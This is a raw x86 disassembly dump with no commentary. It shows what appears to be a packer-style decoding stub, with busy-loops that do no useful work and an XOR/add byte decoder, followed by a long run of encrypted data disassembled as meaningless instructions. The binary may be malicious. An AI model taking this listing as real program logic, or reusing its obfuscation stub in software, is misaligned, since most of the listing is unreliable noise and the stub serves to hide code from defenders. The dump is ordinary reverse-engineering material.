  41036f:	adc    DWORD PTR ds:0x43379f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433813,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433813
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433813,ecx
  41038f:	cmp    DWORD PTR ds:0x433813,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x4337e7
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433813,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433813
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433813,ecx
  4103c8:	cmp    DWORD PTR ds:0x433813,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x43375f,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x433757,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x433757
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x433757,esi
  4103ff:	cmp    DWORD PTR ds:0x433757,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x433757,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x8a,al
  41049c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41049d:	in     eax,dx
  41049e:	add    esp,ebx
  4104a0:	mov    al,0x7e
  4104a2:	jle    0x410453
  4104a4:	jl     0x410524
  4104a6:	jle    0x410523
  4104a8:	push   edx
  4104a9:	or     bh,BYTE PTR [ebp+0x15b3f544]
  4104af:	(bad)  
  4104b0:	xor    al,0x97
  4104b2:	sub    esi,ebx
  4104b4:	xchg   ebp,eax
  4104b5:	xchg   edi,eax
  4104b6:	push   cs
  4104b7:	sbb    eax,0x556d3bd7
  4104bc:	out    dx,eax
  4104bd:	data16 mov al,0xfe
  4104c0:	cmp    esi,esi
  4104c2:	cmp    eax,0xf43eab5
  4104c7:	add    BYTE PTR [ebp+0x1d],0x2
  4104cb:	aas    
  4104cc:	aad    0x20
  4104ce:	js     0x4104a8
  4104d0:	aas    
  4104d1:	cli    
  4104d2:	stos   BYTE PTR es:[edi],al
  4104d3:	sub    edx,DWORD PTR [eax+0x34]
  4104d6:	mov    esp,0x7d578855
  4104db:	sbb    BYTE PTR cs:[ebp-0x3033e63],ch
  4104e2:	pusha  
  4104e3:	inc    edx
  4104e4:	push   0xffffffe3
  4104e6:	mov    bh,ah
  4104e8:	jbe    0x4104a6
  4104ea:	mov    ds:0x6798e9be,al
  4104ef:	sub    BYTE PTR [ebx+0x1cc3ab2c],ch
  4104f5:	inc    eax
  4104f6:	sub    ebx,edx
  4104f8:	add    edx,DWORD PTR [eax+0x3e]
  4104fb:	mov    ecx,0xcfd23c59
  410500:	adc    BYTE PTR [edx-0x189637a6],0xce
  410507:	and    edi,DWORD PTR [ecx+0x7cf3a0b0]
  41050d:	test   BYTE PTR [edx-0x6383d043],ch
  410513:	aaa    
  410514:	jg     0x4104fb
  410516:	push   edi
  410517:	mov    bl,dl
  410519:	scas   eax,DWORD PTR es:[edi]
  41051a:	outs   dx,DWORD PTR ds:[esi]
  41051b:	push   ss
  41051c:	outs   dx,BYTE PTR ds:[esi]
  41051d:	lods   al,BYTE PTR ds:[esi]
  41051e:	retf   0xd028
  410521:	scas   al,BYTE PTR es:[edi]
  410522:	push   eax
  410523:	popa   
  410524:	mov    esp,0xd9398bd6
  410529:	xchg   esi,eax
  41052a:	fs cli 
  41052c:	add    edx,ecx
  41052e:	imul   esp,DWORD PTR [ecx+edx*2],0x3e8b6f6f
  410535:	or     ecx,DWORD PTR [ecx-0x2b23755]
  41053b:	pushf  
  41053c:	dec    esp
  41053d:	mov    BYTE PTR [edx-0x7e67f75c],ch
  410543:	sbb    ch,BYTE PTR [ebx]
  410545:	cmc    
  410546:	sbb    bl,BYTE PTR [ebx]
  410548:	ret    
  410549:	xchg   ebp,eax
  41054a:	and    al,0x3d
  41054c:	add    BYTE PTR [eax+edx*4],bh
  41054f:	aaa    
  410550:	sub    DWORD PTR [ebx],edi
  410552:	in     eax,0xef
  410554:	aam    0x74
  410556:	loop   0x41058f
  410558:	ret    0x6cf2
  41055b:	dec    ecx
  41055c:	jbe    0x4105b2
  41055e:	fs (bad) 
  410560:	(bad)  
  410561:	imul   eax,DWORD PTR [eax],0xfffffff5
  410564:	jg     0x41056e
  410566:	mov    dh,0x7a
  410568:	lods   eax,DWORD PTR ds:[esi]
  410569:	hlt    
  41056a:	xor    BYTE PTR [ecx],ah
  41056c:	sub    bl,BYTE PTR [edx-0x35]
  41056f:	mov    dl,BYTE PTR [ebx+0x70]
  410572:	dec    esi
  410573:	jae    0x41050f
  410575:	sbb    ecx,DWORD PTR [esi]
  410577:	pop    esp
  410578:	jl     0x410523
  41057a:	adc    BYTE PTR [ecx+0x5b16620e],dh
  410580:	jno    0x410562
  410582:	push   0x43
  410584:	lahf   
  410585:	mov    esi,0x5af57b3a
  41058a:	neg    DWORD PTR [ebx+0x14]
  41058d:	or     dl,BYTE PTR [esi+0x7]
  410590:	xor    al,0x81
  410592:	jbe    0x41051e
  410594:	dec    ecx
  410595:	mov    bh,bh
  410597:	int    0xc1
  410599:	pop    esi
  41059a:	pop    edi
  41059b:	adc    esi,DWORD PTR [ecx-0x77a31b1c]
  4105a1:	and    edi,DWORD PTR [ebx]
  4105a3:	lods   eax,DWORD PTR ds:[esi]
  4105a4:	adc    dh,BYTE PTR [ecx]
  4105a6:	add    DWORD PTR [edx],0xfffffff2
  4105a9:	sbb    DWORD PTR [eax],esi
  4105ab:	sbb    ch,BYTE PTR [esi]
  4105ad:	or     cl,BYTE PTR [ecx+0x71]
  4105b0:	add    ecx,esp
  4105b2:	sahf   
  4105b3:	cmc    
  4105b4:	push   eax
  4105b5:	enter  0x5a74,0x50
  4105b9:	(bad)  
  4105bb:	bound  ecx,QWORD PTR [ecx]
  4105bd:	xor    eax,DWORD PTR gs:[ecx+0x6e]
  4105c1:	test   dl,bl
  4105c3:	stos   BYTE PTR es:[edi],al
  4105c4:	xchg   esp,eax
  4105c5:	iret   
  4105c6:	in     eax,0x1e
  4105c8:	(bad)  
  4105c9:	ss inc ebx
  4105cb:	jp     0x41060b
  4105cd:	in     al,dx
  4105ce:	push   ss
  4105cf:	fs push ss
  4105d1:	sbb    bh,BYTE PTR [ebx+0x56]
  4105d4:	fdiv   QWORD PTR [ebx+0x1da60d9d]
  4105da:	in     al,dx
  4105db:	cmp    DWORD PTR [edx-0x41],ebx
  4105de:	jg     0x410612
  4105e0:	or     ah,BYTE PTR [ebx-0x15]
  4105e3:	setbe  BYTE PTR [eax+0x19171bc4]
  4105ea:	add    al,BYTE PTR [edi-0x10]
  4105ed:	cwde   
  4105ee:	mov    bl,bh
  4105f0:	hlt    
  4105f1:	xor    ecx,DWORD PTR [esi+0x62dfd8cc]
  4105f7:	pop    ebx
  4105f8:	ret    
  4105f9:	dec    eax
  4105fa:	loopne 0x410630
  4105fc:	shr    edi,cl
  4105fe:	jae    0x41061e
  410600:	cmp    BYTE PTR [eax-0x4c197a80],cl
  410606:	sub    BYTE PTR [esi-0x41f42764],bl
  41060c:	(bad)  
  41060d:	je     0x41060f
  41060f:	dec    ebp
  410610:	jbe    0x4105d2
  410612:	hlt    
  410613:	ret    
  410614:	iret   
  410615:	popf   
  410616:	pop    esp
  410617:	or     edx,esi
  410619:	sub    BYTE PTR [eax],al
  41061b:	xor    BYTE PTR [edx+0x38],0x78
  41061f:	addr16 jae 0x410611
  410622:	push   eax
  410623:	test   DWORD PTR [edx],esp
  410625:	cmp    BYTE PTR [ebp-0x7e],bh
  410628:	in     eax,dx
  410629:	iret   
  41062a:	fiadd  DWORD PTR [edi]
  41062c:	or     bh,cl
  41062e:	imul   esp,DWORD PTR [ebp-0x782f32c5],0xe30fd6c3
  410638:	mov    dl,0xdb
  41063a:	adc    al,BYTE PTR [esi-0xaf69896]
  410640:	mul    BYTE PTR [ecx-0x59]
  410643:	jae    0x4106c0
  410645:	scas   eax,DWORD PTR es:[edi]
  410646:	pop    esp
  410647:	adc    dh,dl
  410649:	xchg   DWORD PTR [edi-0x5e],edi
  41064c:	or     eax,0x1e694866
  410651:	bound  ebx,QWORD PTR [edi+0x1dd775a6]
  410657:	xchg   edi,eax
  410658:	leave  
  410659:	jge    0x41067f
  41065b:	rcl    BYTE PTR ds:0x92debb46,cl
  410661:	test   eax,0xfac04537
  410666:	cmp    edx,ecx
  410668:	les    edx,FWORD PTR [edi+0x3035d2e]
  41066e:	pusha  
  41066f:	(bad)  
  410670:	sub    eax,0xd3b29dab
  410675:	cmp    BYTE PTR [edi+0x5c],al
  410678:	push   esp
  410679:	popf   
  41067a:	add    esi,DWORD PTR [ebp+0x40]
  41067d:	xchg   edi,eax
  41067e:	pushf  
  41067f:	mov    ebp,0xcc616d07
  410684:	ins    BYTE PTR es:[edi],dx
  410685:	ins    DWORD PTR es:[edi],dx
  410686:	test   edi,ebx
  410688:	int    0xf5
  41068a:	mov    edi,0xb4c339cd
  41068f:	adc    esi,eax
  410691:	dec    ecx
  410692:	(bad)  
  410693:	cmp    BYTE PTR [ebp-0x10f845cd],bl
  410699:	or     ecx,DWORD PTR [edi]
  41069b:	cdq    
  41069c:	retf   
  41069d:	dec    edi
  41069e:	dec    edi
  41069f:	ret    0x8506
  4106a2:	adc    ebp,eax
  4106a4:	xor    DWORD PTR [ecx+0x504a4a53],esi
  4106aa:	pop    ds
  4106ab:	fld    QWORD PTR [ebx+0x3104f279]
  4106b1:	add    ecx,edi
  4106b3:	sti    
  4106b4:	inc    eax
  4106b5:	cmp    cl,BYTE PTR [esi+0x246574f6]
  4106bb:	mov    dl,0xa1
  4106bd:	shr    BYTE PTR [edi+0x7cd653de],0x8a
  4106c4:	test   BYTE PTR [ecx-0x5a],dh
  4106c7:	(bad)  
  4106c8:	xlat   BYTE PTR ds:[ebx]
  4106c9:	jl     0x410701
  4106cb:	mov    esi,0x4f6c40f6
  4106d0:	fsub   QWORD PTR [esi]
  4106d2:	gs cmc 
  4106d4:	ins    BYTE PTR es:[edi],dx
  4106d5:	aad    0x2c
  4106d7:	sbb    bh,BYTE PTR [ecx]
  4106d9:	dec    esp
  4106da:	adc    bh,BYTE PTR [ecx+0x734bdaab]
  4106e0:	pop    esi
  4106e1:	mov    al,0x74
  4106e3:	scas   al,BYTE PTR es:[edi]
  4106e4:	xor    edi,esi
  4106e6:	mov    esi,0xf6eb345c
  4106eb:	push   ebp
  4106ec:	cli    
  4106ed:	and    BYTE PTR [edi],0x66
  4106f0:	inc    eax
  4106f1:	fcom   DWORD PTR [esi+0x48]
  4106f4:	mov    WORD PTR [edi+eiz*8],gs
  4106f7:	and    edx,DWORD PTR [eax+0x6a5c387e]
  4106fd:	and    eax,0xd6e5c9e9
  410702:	pop    eax
  410703:	sub    BYTE PTR [esi-0x5e],0x4b
  410707:	test   al,0xb1
  410709:	fdivp  st(6),st
  41070b:	mov    DWORD PTR [esi+0x73],eax
  41070e:	out    dx,eax
  41070f:	or     al,dh
  410711:	aaa    
  410712:	ins    DWORD PTR es:[edi],dx
  410713:	bound  edi,QWORD PTR [ebp+0x73688c09]
  410719:	ret    
  41071a:	hlt    
  41071b:	das    
  41071c:	inc    edx
  41071d:	or     eax,0xfc5695c6
  410722:	lahf   
  410723:	cmp    esp,edi
  410725:	adc    BYTE PTR [ebp-0x5e],0x55
  410729:	(bad)  
  41072b:	pop    es
  41072c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41072d:	and    esp,eax
  41072f:	jbe    0x41072c
  410731:	lea    ebp,[ecx-0x4f]
  410734:	es pop cx
  410737:	lds    edx,FWORD PTR [edx]
  410739:	adc    BYTE PTR [edi+0x27],bh
  41073c:	add    BYTE PTR [edi],bh
  41073e:	outs   dx,DWORD PTR ds:[esi]
  41073f:	adc    eax,0x71321ae3
  410744:	js     0x41073c
  410746:	add    ebx,DWORD PTR [edx-0x44db85e0]
  41074c:	mov    eax,0x4c152552
  410751:	js     0x4107a9
  410753:	dec    ebp
  410754:	or     edi,DWORD PTR [esi-0x6f]
  410757:	adc    eax,0x42f4458b
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0xe1ba1f52
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x41072e
  41078c:	dec    edi
  41078d:	xchg   DWORD PTR [eax+0x7],ebx
  410790:	pop    esi
  410791:	popa   
  410792:	or     dh,BYTE PTR [edx+0x19d10f35]
  410798:	inc    esi
  410799:	xor    eax,esi
  41079b:	add    bh,ch
  41079d:	xchg   ecx,eax
  41079e:	inc    ebp
  41079f:	in     al,0x94
  4107a1:	or     eax,0xc21f2fbc
  4107a6:	sub    dl,dh
  4107a8:	cmp    eax,DWORD PTR [ebx-0x18]
  4107ab:	rcl    BYTE PTR [ebp+0x574afb3],1
  4107b1:	jecxz  0x410773
  4107b3:	inc    edx
  4107b4:	movd   mm2,DWORD PTR [esi]
  4107b7:	enter  0x6dc3,0x90
  4107bb:	pop    ss
  4107bc:	inc    edi
  4107bd:	cld    
  4107be:	icebp  
  4107bf:	inc    edx
  4107c0:	add    DWORD PTR [eax-0x2454e0ae],ecx
  4107c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107c7:	jae    0x4107c2
  4107c9:	push   0x1ffa525d
  4107ce:	xacquire xchg BYTE PTR ds:0xb6d75b96,ch
  4107d5:	adc    ecx,DWORD PTR [eax-0x5]
  4107d8:	outs   dx,DWORD PTR ds:[esi]
  4107d9:	enter  0x5943,0x18
  4107dd:	cwde   
  4107de:	xchg   ebp,eax
  4107df:	sti    
  4107e0:	les    ebx,FWORD PTR [eax]
  4107e2:	or     cl,BYTE PTR [esi-0x7f]
  4107e5:	jb     0x410844
  4107e7:	add    ch,BYTE PTR [ecx+ebx*8]
  4107ea:	lods   eax,DWORD PTR ds:[esi]
  4107eb:	pop    ss
  4107ec:	js     0x410804
  4107ee:	(bad)  
  4107ef:	or     al,0x17
  4107f1:	nop
  4107f2:	push   edx
  4107f3:	mov    dh,0xb5
  4107f5:	imul   ebp,edx,0x53
  4107f8:	and    DWORD PTR [eax-0x31af0bbb],eax
  4107fe:	sub    DWORD PTR [edi+0x50],0xffffff88
  410802:	int    0x5b
  410804:	pop    eax
  410805:	push   ecx
  410806:	and    BYTE PTR [esi],ch
  410808:	sti    
  410809:	addr16 push ebx
  41080b:	add    eax,0xf910eab3
  410810:	jp     0x41081e
  410812:	pop    ss
  410813:	arpl   bx,si
  410815:	push   edi
  410816:	push   cs
  410817:	inc    eax
  410818:	lahf   
  410819:	in     al,0x3c
  41081b:	adc    al,0x8b
  41081d:	mov    al,ds:0x696a463c
  410822:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410823:	fdiv   QWORD PTR [esi-0x53]
  410826:	push   0xfffffffe
  410828:	adc    BYTE PTR [eax],dl
  41082a:	xor    bl,BYTE PTR [esi-0x54]
  41082d:	cld    
  41082e:	jb     0x4107d3
  410830:	xor    eax,DWORD PTR [esi+edx*1+0x50]
  410834:	adc    bl,BYTE PTR [esi-0x4340f351]
  41083a:	mov    ebp,0x30d3ba10
  41083f:	add    BYTE PTR [esi],al
  410841:	adc    al,0x26
  410843:	mov    esp,0x48eea9b5
  410848:	pop    eax
  410849:	fild   WORD PTR [edx]
  41084b:	mov    ecx,0xf930a6ca
  410850:	mov    ebx,0xa3cbbbfe
  410855:	or     edi,DWORD PTR [ebx+0x1]
  410858:	loopne 0x410881
  41085a:	retf   0x721a
  41085d:	push   0x88b9437d
  410862:	dec    edx
  410863:	adc    DWORD PTR [ebp+0x60],ebp
  410866:	cmp    eax,0x3eadaec
  41086b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41086c:	pop    ds
  41086d:	inc    ebp
  41086e:	sbb    BYTE PTR fs:[edx-0x2addd58c],bh
  410875:	icebp  
  410876:	xchg   BYTE PTR [ebx+0x47],al
  410879:	not    BYTE PTR [esi-0x16]
  41087c:	pusha  
  41087d:	and    edx,DWORD PTR [edi-0x540493f6]
  410883:	xor    al,0xdb
  410885:	push   ss
  410886:	sub    DWORD PTR [esi],ebp
  410888:	jae    0x4108c3
  41088a:	popf   
  41088b:	push   esi
  41088c:	xor    DWORD PTR [esi+0x15],edx
  41088f:	aad    0xb7
  410891:	pushf  
  410892:	js     0x41085c
  410894:	jb     0x410900
  410896:	jno    0x41083d
  410898:	or     eax,0xd659a231
  41089d:	xchg   BYTE PTR [esi],cl
  41089f:	es mov al,0x6d
  4108a2:	push   0xffffff8b
  4108a4:	iret   
  4108a5:	dec    ecx
  4108a6:	imul   ebp,DWORD PTR [edi-0x6a],0x52858dcf
  4108ad:	pop    esp
  4108ae:	cwde   
  4108af:	gs cld 
  4108b1:	mov    esi,0xbeafb212
  4108b6:	jbe    0x41084c
  4108b8:	sti    
  4108b9:	inc    eax
  4108ba:	lds    esp,FWORD PTR [edx+0x2c]
  4108bd:	cmp    eax,0x59f406de
  4108c2:	xchg   BYTE PTR [ebp+0x2897b16f],bl
  4108c8:	or     BYTE PTR [eax-0x7e],al
  4108cb:	mov    bl,0x19
  4108cd:	push   0x481ef05e
  4108d2:	dec    BYTE PTR [eax]
  4108d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108d5:	jge    0x4108eb
  4108d7:	mov    esp,0x3f8a4cd2
  4108dc:	jo     0x410908
  4108de:	add    ecx,DWORD PTR [ecx-0x33]
  4108e1:	xlat   BYTE PTR ds:[ebx]
  4108e2:	rcr    BYTE PTR [edx-0x9e1914],cl
  4108e8:	popf   
  4108e9:	(bad)  
  4108ea:	jae    0x41091a
  4108ec:	dec    edi
  4108ed:	(bad)  
  4108ef:	or     dh,BYTE PTR [edi-0x1d751fd3]
  4108f5:	or     bh,BYTE PTR [ecx-0x4b]
  4108f8:	pop    esi
  4108f9:	pop    ss
  4108fa:	imul   esp,DWORD PTR [ecx+0x1b5680bb],0xb052791e
  410904:	inc    edx
  410905:	add    eax,0xb7911804
  41090a:	arpl   ax,sp
  41090c:	push   0x6b0be090
  410911:	lock pop es
  410913:	cwde   
  410914:	std    
  410915:	inc    esi
  410916:	es and eax,0x7836e7b2
  41091c:	bound  edx,QWORD PTR [ecx]
  41091e:	jno    0x410928
  410920:	jmp    esi
  410922:	inc    edi
  410923:	cmp    BYTE PTR ds:0xceed452b,dl
  410929:	lea    edi,[eax+eiz*8+0x6c2acdd1]
  410930:	jb     0x4108c0
  410932:	ins    BYTE PTR es:[edi],dx
  410933:	stos   DWORD PTR es:[edi],eax
  410934:	neg    BYTE PTR [ecx+eiz*2-0x689ebe4a]
  41093b:	sbb    eax,0x5c85efef
  410940:	jmp    0xf130:0xd20c10f
  410947:	push   0xffffffe0
  410949:	mov    dl,0x40
  41094b:	push   edi
  41094c:	gs cwde 
  41094e:	adc    eax,0xae23eca1
  410953:	scas   eax,DWORD PTR es:[edi]
  410954:	lea    edi,[esi]
  410956:	dec    edi
  410957:	mov    ebp,0x44f08d03
  41095c:	leave  
  41095d:	je     0x410959
  41095f:	sub    eax,0x9d21a7ac
  410964:	xchg   DWORD PTR [edi],edi
  410966:	addr16 mov al,0xa1
  410969:	mov    ebp,0xa45f0fee
  41096e:	iret   
  41096f:	pop    es
  410970:	push   ss
  410971:	jge    0x4109c7
  410973:	xor    DWORD PTR [edx-0x35c3540a],0x3d7e590d
  41097d:	mov    WORD PTR [ebx+edi*1],es
  410980:	jl     0x410944
  410982:	adc    BYTE PTR [eax+0x7c65e61f],cl
  410988:	stos   DWORD PTR es:[edi],eax
  410989:	clc    
  41098a:	sub    ecx,DWORD PTR [ecx+0x2e]
  41098d:	es mov bl,0x72
  410990:	scas   eax,DWORD PTR es:[edi]
  410991:	sub    ah,ah
  410993:	out    0x7,al
  410995:	mov    WORD PTR [ebx-0x2cb957f6],fs
  41099b:	sbb    BYTE PTR [edi+ecx*2-0x4ae3b41b],al
  4109a2:	sub    BYTE PTR [ebx-0xb],ah
  4109a5:	call   0x4f1c6437
  4109aa:	mov    al,ds:0x21918f41
  4109af:	lods   eax,DWORD PTR ss:[esi]
  4109b1:	sub    eax,0x431aec8a
  4109b6:	jne    0x410a1e
  4109b8:	fist   WORD PTR [ebp+ecx*1-0x36]
  4109bc:	mov    esi,0x9acdf4d6
  4109c1:	xchg   ebp,eax
  4109c2:	jge    0x410951
  4109c4:	sahf   
  4109c5:	push   esi
  4109c6:	mov    ds,WORD PTR [eax+0x4c]
  4109c9:	sbb    eax,0xae2f0ec8
  4109ce:	lock xlat BYTE PTR ds:[ebx]
  4109d0:	jl     0x410996
  4109d2:	jnp    0x41095e
  4109d4:	aad    0xdd
  4109d6:	inc    ebp
  4109d7:	sub    cl,BYTE PTR [esi+0x5b9aa9b6]
  4109dd:	iret   
  4109de:	mov    esi,0x6823fecf
  4109e3:	jp     0x410995
  4109e5:	sub    al,0x92
  4109e7:	mov    WORD PTR [edx+0x3b],?
  4109ea:	ins    DWORD PTR es:[edi],dx
  4109eb:	pushf  
  4109ec:	aad    0x30
  4109ee:	push   ss
  4109ef:	or     DWORD PTR [esi-0x5d2a2b53],0xe19c7d35
  4109f9:	push   ss
  4109fa:	clc    
  4109fb:	in     al,0xb1
  4109fd:	dec    esp
  4109fe:	dec    esp
  4109ff:	imul   edi,DWORD PTR [ecx+0x4b],0x1a
  410a03:	hlt    
  410a04:	and    eax,0xe7db6f08
  410a09:	cmp    ah,BYTE PTR fs:[ebx+0x6a30ef03]
  410a10:	ss mov bh,0xcc
  410a13:	mov    bh,BYTE PTR [edx]
  410a15:	xor    ebp,ebx
  410a17:	test   ch,cl
  410a19:	rol    esi,cl
  410a1b:	mov    edi,0x7d6cd041
  410a20:	popa   
  410a21:	cmp    al,0xba
  410a23:	or     ebx,DWORD PTR [ebp+0x27e138b]
  410a29:	pop    edx
  410a2a:	lds    edx,FWORD PTR [ecx]
  410a2c:	dec    eax
  410a2d:	sar    DWORD PTR [edx-0x2ffae614],0xb7
  410a34:	jno    0x410a01
  410a36:	sar    bl,1
  410a38:	dec    ebx
  410a39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a3a:	retf   0x30a
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	ret    
  410a50:	inc    eax
  410a51:	aam    0x6a
  410a53:	mov    edx,0xaf7e7ebd
  410a58:	jl     0x410ad8
  410a5a:	jle    0x4109dc
  410a5c:	leave  
  410a5d:	jmp    0x406b:0x7b39e5c3
  410a64:	retf   
  410a65:	jmp    0x410a2a
  410a67:	jne    0x410abd
  410a69:	cli    
  410a6a:	popf   
  410a6b:	and    eax,0xba45a1f6
  410a70:	xor    al,0xdc
  410a72:	imul   esp,DWORD PTR [ebp-0x70c1aad7],0x1ed1c7bf
  410a7c:	push   ebx
  410a7d:	add    DWORD PTR [esi-0x4e],ecx
  410a80:	mov    esp,0xdfa6b95c
  410a85:	sub    DWORD PTR [ebx+0x77cd7e14],esi
  410a8b:	iret   
  410a8c:	push   ebx
  410a8d:	or     eax,DWORD PTR [eax+0x11]
  410a90:	dec    ecx
  410a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a92:	push   DWORD PTR [edx]
  410a94:	jg     0xacc96f89
  410a9a:	adc    eax,0xaec42758
  410a9f:	retf   
  410aa0:	ss gs pop edx
  410aa3:	aam    0xc2
  410aa5:	arpl   WORD PTR [edi+esi*2-0x28],si
  410aa9:	icebp  
  410aaa:	xor    dl,cl
  410aac:	icebp  
  410aad:	or     cl,BYTE PTR [ecx+ebp*4-0x4097ed2a]
  410ab4:	in     eax,dx
  410ab5:	jge    0x410ae5
  410ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ab8:	pop    ebx
  410ab9:	jns    0x54ab6faa
  410abf:	hlt    
  410ac0:	jmp    0x410a6a
  410ac2:	shl    BYTE PTR [ecx-0x1a],0xc5
  410ac6:	push   esi
  410ac7:	push   esp
  410ac8:	pop    esp
  410ac9:	into   
  410aca:	dec    eax
  410acb:	sbb    DWORD PTR [ecx+0x3597fe60],ebx
  410ad1:	outs   dx,BYTE PTR ds:[esi]
  410ad2:	adc    ax,WORD PTR [edi-0x54]
  410ad6:	in     al,0x8f
  410ad8:	inc    esp
  410ad9:	cmp    al,0xcd
  410adb:	or     al,BYTE PTR [esi+0x16]
  410ade:	jp     0x410a76
  410ae0:	mov    BYTE PTR [ebp+0x1cacff8b],bl
  410ae6:	aam    0xdf
  410ae8:	inc    edi
  410ae9:	cmp    DWORD PTR [ecx],0xd
  410aec:	stos   BYTE PTR es:[edi],al
  410aed:	or     DWORD PTR [ebp+0xded18bf],esi
  410af3:	push   0xbe496d5
  410af8:	xor    eax,ebp
  410afa:	or     al,0xaf
  410afc:	mov    ecx,0x4369f
  410b01:	lahf   
  410b02:	out    dx,al
  410b03:	push   ss
  410b04:	cs sub cl,0xc2
  410b08:	stos   BYTE PTR es:[edi],al
  410b09:	std    
  410b0a:	cld    
  410b0b:	int3   
  410b0c:	jnp    0x410acc
  410b0e:	pop    esp
  410b0f:	ror    eax,1
  410b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b12:	sbb    bl,ah
  410b14:	in     al,dx
  410b15:	xchg   DWORD PTR [edi-0x16],edx
  410b18:	pop    ds
  410b19:	in     eax,0x86
  410b1b:	data16 out dx,al
  410b1d:	xor    esp,DWORD PTR [ebx+0x3dce683e]
  410b23:	push   ecx
  410b24:	dec    ebp
  410b25:	or     cl,0x2b
  410b28:	daa    
  410b29:	fcom   st(2)
  410b2b:	jmp    0x410b81
  410b2d:	retf   
  410b2e:	(bad)  
  410b2f:	jo     0x410b6d
  410b31:	inc    esp
  410b32:	test   al,0xd8
  410b34:	call   0x635648d6
  410b39:	adc    dh,ch
  410b3b:	pop    eax
  410b3c:	xchg   bh,bh
  410b3e:	jge    0x410b81
  410b40:	scas   eax,DWORD PTR es:[edi]
  410b41:	pop    ebp
  410b42:	pusha  
  410b43:	sbb    DWORD PTR [ebp-0x52],edx
  410b46:	je     0x410b5d
  410b48:	pop    ebx
  410b49:	add    cl,BYTE PTR [ebx-0x49366b66]
  410b4f:	xor    al,0x4b
  410b51:	xor    DWORD PTR [ebx-0x6486b617],ecx
  410b57:	clc    
  410b58:	icebp  
  410b59:	sbb    cl,BYTE PTR [esp+edx*1]
  410b5c:	std    
  410b5d:	inc    esi
  410b5e:	pop    eax
  410b5f:	mov    al,ds:0x4fa434cf
  410b64:	push   cs
  410b65:	pushf  
  410b66:	sub    eax,0xd20c78ba
  410b6b:	test   DWORD PTR [edx+0x60746270],eax
  410b71:	mov    BYTE PTR [eax+0x4e],al
  410b74:	add    ebx,eax
  410b76:	inc    ebx
  410b77:	mov    cl,0xfb
  410b79:	sbb    BYTE PTR [edi-0x210dee9a],bl
  410b7f:	mov    ah,0x6a
  410b81:	ds mov bh,0xe0
  410b84:	cmp    eax,0xb90961bd
  410b89:	pop    eax
  410b8a:	aad    0x34
  410b8c:	inc    edx
  410b8d:	xor    DWORD PTR [ebp-0x3214d08],eax
  410b93:	push   cs
  410b94:	jb     0x410bf5
  410b96:	aam    0xd8
  410b98:	push   edx
  410b99:	pop    es
  410b9a:	push   es
  410b9b:	enter  0x6d26,0x56
  410b9f:	push   ds
